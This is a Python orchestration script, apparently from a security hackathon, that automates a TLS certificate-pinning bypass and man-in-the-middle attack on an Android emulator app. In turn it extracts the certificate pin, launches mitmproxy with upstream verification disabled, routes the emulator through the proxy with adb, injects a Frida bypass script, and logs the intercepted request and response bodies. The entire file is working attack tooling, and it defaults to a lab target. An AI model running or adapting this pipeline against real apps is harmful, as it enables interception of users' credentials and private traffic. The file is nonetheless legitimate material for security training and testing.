#!/usr/bin/env python3
"""
================================================================
  attack_orchestrator.py — Full Attack Pipeline Controller
  Hackathon #31: TLS Certificate Pinning Bypass & MitM Attack
  MITRE ATT&CK: T1557 (AitM), T1040 (Network Sniffing)
================================================================

Ties together all attacker components into a single CLI:

  Step 1: Analyse target certificate & compute pin
  Step 2: Start mitmproxy interception proxy
  Step 3: Set up Android emulator proxy routing via adb
  Step 4: Inject Frida bypass script into running app
  Step 5: Monitor intercepted traffic in real time
  Step 6: Generate HTML attack report

USAGE:
  python3 attack_orchestrator.py --target 10.0.2.2 --port 5000
================================================================
"""

import subprocess
import sys
import os
import time
import json
import argparse
import threading
import shutil
from pathlib import Path
from datetime import datetime

# ── ANSI ─────────────────────────────────────────────────────
R="\033[31m"; G="\033[32m"; Y="\033[33m"; C="\033[36m"
B="\033[34m"; M="\033[35m"; W="\033[37m"; BOLD="\033[1m"; RST="\033[0m"

BANNER = f"""
{R}{BOLD}
  ╔══════════════════════════════════════════════════════════════╗
  ║   ATTACKER TOOLKIT — TLS Pinning Bypass & MitM Attack       ║
  ║   Hackathon #31  |  MITRE T1557 + T1040                     ║
  ║   Architecture: Cloud-Native Android App                     ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  STEP 1: Cert extraction & SPKI pin computation             ║
  ║  STEP 2: mitmproxy interception (port 8080)                 ║
  ║  STEP 3: Android emulator proxy routing (adb)               ║
  ║  STEP 4: Frida pinning bypass injection                     ║
  ║  STEP 5: Live traffic monitoring                            ║
  ║  STEP 6: HTML attack report generation                      ║
  ╚══════════════════════════════════════════════════════════════╝
{RST}"""

LOG_FILE        = "intercepted_traffic.json"
FRIDA_SCRIPT    = os.path.join(os.path.dirname(__file__), "..", "frida-scripts", "bypass_pinning.js")
ADDON_PATH      = os.path.join(os.path.dirname(__file__), "..", "mitm", "intercept_addon.py")
REPORT_DIR      = os.path.join(os.path.dirname(__file__), "..", "reports")
PKG_NAME        = "com.example.secureapp"
PROXY_HOST      = "127.0.0.1"
PROXY_PORT      = 8080

os.makedirs(REPORT_DIR, exist_ok=True)


# ── Helpers ───────────────────────────────────────────────────

def step(n: int, title: str) -> None:
    print(f"\n{C}{BOLD}{'─'*60}{RST}")
    print(f"{C}{BOLD}  STEP {n}: {title}{RST}")
    print(f"{C}{'─'*60}{RST}")


def run(cmd: list, capture=False, check=False) -> subprocess.CompletedProcess:
    print(f"{Y}  $ {' '.join(cmd)}{RST}")
    return subprocess.run(cmd, capture_output=capture, text=True, check=check)


def check_tool(name: str) -> bool:
    found = shutil.which(name) is not None
    status = f"{G}✓ found{RST}" if found else f"{R}✗ not found{RST}"
    print(f"  {name:20s} {status}")
    return found


# ── Steps ─────────────────────────────────────────────────────

def step1_cert_analysis(target: str, port: int) -> None:
    step(1, "Certificate Extraction & SPKI Pin Analysis")
    cert_tool = os.path.join(os.path.dirname(__file__),
                             "..", "cert-tools", "cert_extractor.py")
    run([sys.executable, cert_tool, "--host", target, "--port", str(port)])


def step2_start_mitmproxy() -> subprocess.Popen:
    step(2, "Starting mitmproxy Interception Proxy (port 8080)")

    # Prefer mitmdump for non-interactive (CI) / mitmproxy for interactive
    tool = shutil.which("mitmdump") or shutil.which("mitmproxy")
    if not tool:
        print(f"{R}  [✗] mitmproxy not found! Install with:{RST}")
        print(f"      pip install mitmproxy")
        return None

    cmd = [
        tool,
        "-s",     ADDON_PATH,
        "-p",     str(PROXY_PORT),
        "--ssl-insecure",            # don't verify upstream cert
        "--set", "termlog_verbosity=warn",
    ]
    print(f"{G}  [+] Launching: {' '.join(cmd)}{RST}")
    print(f"{G}  [+] Traffic log → {LOG_FILE}{RST}")

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True)

    # Stream output in background thread
    def _tail():
        for line in proc.stdout:
            print(f"  {C}[mitmproxy]{RST} {line}", end="")
    t = threading.Thread(target=_tail, daemon=True)
    t.start()

    time.sleep(2)   # let proxy warm up
    return proc


def step3_adb_proxy() -> None:
    step(3, "Configuring Android Emulator Proxy via adb")

    if not shutil.which("adb"):
        print(f"{Y}  [!] adb not found — configure emulator proxy manually:{RST}")
        print(f"      Settings → WiFi → Long-press network → Modify Network")
        print(f"      Proxy: {PROXY_HOST}  Port: {PROXY_PORT}")
        return

    # List connected devices
    result = run(["adb", "devices"], capture=True)
    print(result.stdout)

    # Set system-level proxy on emulator
    cmds = [
        ["adb", "shell", "settings", "put", "global", "http_proxy",
         f"{PROXY_HOST}:{PROXY_PORT}"],
        # For HTTPS we also need transparent proxy or the app routed through it
        ["adb", "shell", "settings", "put", "global", "global_http_proxy_host",
         PROXY_HOST],
        ["adb", "shell", "settings", "put", "global", "global_http_proxy_port",
         str(PROXY_PORT)],
    ]
    for cmd in cmds:
        run(cmd)

    print(f"{G}  [+] Proxy set to {PROXY_HOST}:{PROXY_PORT} on emulator{RST}")
    print(f"{Y}  [!] Also install mitmproxy CA cert on device:{RST}")
    print(f"      ~/.mitmproxy/mitmproxy-ca-cert.pem")
    print(f"      adb push ~/.mitmproxy/mitmproxy-ca-cert.pem /sdcard/")
    print(f"      Settings → Security → Install certificate → mitmproxy-ca-cert.pem")


def step4_frida_inject(package: str, interactive: bool) -> None:
    step(4, f"Frida Pinning Bypass Injection → {package}")

    if not shutil.which("frida"):
        print(f"{R}  [✗] frida-tools not found! Install with:{RST}")
        print(f"      pip install frida-tools")
        print(f"\n{Y}  Manual Frida commands:{RST}")
        print(f"  # Push Frida server to emulator:")
        print(f"  adb push frida-server /data/local/tmp/")
        print(f"  adb shell 'chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &'")
        print(f"\n  # Inject bypass script:")
        print(f"  frida -U -n {package} -s {FRIDA_SCRIPT}")
        print(f"  # OR spawn-inject:")
        print(f"  frida -U -f {package} -s {FRIDA_SCRIPT} --no-pause")
        return

    if interactive:
        # Spawn-inject (most reliable — bypasses anti-debug on attach)
        run(["frida", "-U", "-f", package, "-s", FRIDA_SCRIPT, "--no-pause"])
    else:
        # Attach to already-running app
        result = run(["frida", "-U", "-n", package, "-s", FRIDA_SCRIPT,
                      "--no-pause"], capture=True)
        if result.returncode == 0:
            print(f"{G}  [+] Frida injected successfully!{RST}")
        else:
            print(f"{R}  [✗] Frida injection failed:{RST}")
            print(result.stderr)


def step5_monitor() -> None:
    step(5, "Live Traffic Monitor (Ctrl+C to stop)")
    print(f"{G}  Watching {LOG_FILE} for intercepted traffic...{RST}\n")

    seen = 0
    try:
        while True:
            if Path(LOG_FILE).exists():
                with open(LOG_FILE) as f:
                    entries = json.load(f)
                if len(entries) > seen:
                    for e in entries[seen:]:
                        _print_traffic_entry(e)
                    seen = len(entries)
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}  [!] Monitor stopped. Total captured: {seen} entries.{RST}")


def _print_traffic_entry(e: dict) -> None:
    ts = e.get("timestamp", "")
    if e.get("direction") == "REQUEST":
        print(f"{M}  [{ts}] ▶ REQUEST  {e['method']} {e['url']}{RST}")
        if e.get("body"):
            print(f"  {W}    BODY: {e['body'][:200]}{RST}")
    else:
        code = e.get("status_code", "?")
        color = G if str(code).startswith("2") else R
        print(f"{color}  [{ts}] ◀ RESPONSE {code} ← {e['url']}{RST}")
        if e.get("body"):
            print(f"  {W}    BODY: {e['body'][:300]}{RST}")
        cert = e.get("cert_info", {})
        if cert.get("subject"):
            print(f"  {C}    CERT CN: {cert['subject']}{RST}")


def step6_report() -> None:
    step(6, "Generating HTML Attack Report")
    from report_generator import generate_report
    entries = []
    if Path(LOG_FILE).exists():
        with open(LOG_FILE) as f:
            entries = json.load(f)
    out = generate_report(entries)
    print(f"{G}  [+] Report → {out}{RST}")


# ── Main ──────────────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="TLS MitM Attack Orchestrator")
    parser.add_argument("--target",      default="10.0.2.2",
                        help="Target server IP (default: 10.0.2.2)")
    parser.add_argument("--port",        type=int, default=5000,
                        help="Target server port (default: 5000)")
    parser.add_argument("--package",     default=PKG_NAME,
                        help="Android app package name")
    parser.add_argument("--step",        type=int, default=0,
                        help="Run a specific step only (1-6), 0 = all")
    parser.add_argument("--spawn",       action="store_true",
                        help="Spawn-inject Frida (vs attach to running app)")
    parser.add_argument("--report-only", action="store_true",
                        help="Only generate report from existing log")
    args = parser.parse_args()

    # Tool availability check
    print(f"{BOLD}Checking required tools:{RST}")
    tools = {
        "mitmproxy / mitmdump" : "mitmdump",
        "frida"                : "frida",
        "adb"                  : "adb",
        "python3"              : "python3",
    }
    for label, cmd in tools.items():
        check_tool(cmd)

    if args.report_only:
        step6_report()
        return

    proxy_proc = None
    try:
        if args.step in (0, 1):
            step1_cert_analysis(args.target, args.port)
        if args.step in (0, 2):
            proxy_proc = step2_start_mitmproxy()
        if args.step in (0, 3):
            step3_adb_proxy()
        if args.step in (0, 4):
            step4_frida_inject(args.package, args.spawn)
        if args.step in (0, 5):
            step5_monitor()
        if args.step in (0, 6):
            step6_report()

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user{RST}")
    finally:
        if proxy_proc:
            proxy_proc.terminate()
            print(f"{Y}[!] mitmproxy stopped{RST}")
        # Clean up emulator proxy
        if shutil.which("adb"):
            subprocess.run(["adb", "shell", "settings", "delete",
                           "global", "http_proxy"], capture_output=True)


if __name__ == "__main__":
    main()
